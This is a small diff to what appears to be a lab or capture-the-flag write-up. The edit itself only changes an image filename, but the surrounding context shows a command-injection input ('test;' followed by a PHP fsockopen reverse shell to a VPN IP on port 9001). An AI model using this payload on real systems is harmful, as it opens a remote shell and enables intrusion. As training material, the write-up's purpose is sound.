@@ -89,4 +89,4 @@ Replace `10.18.1.159` with your own VPN IP
 test; php -r '$sock=fsockopen("10.18.1.159",9001);`sh <&3 >&3 2>&3`;'
 ```
 
-<figure><img src="../../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>
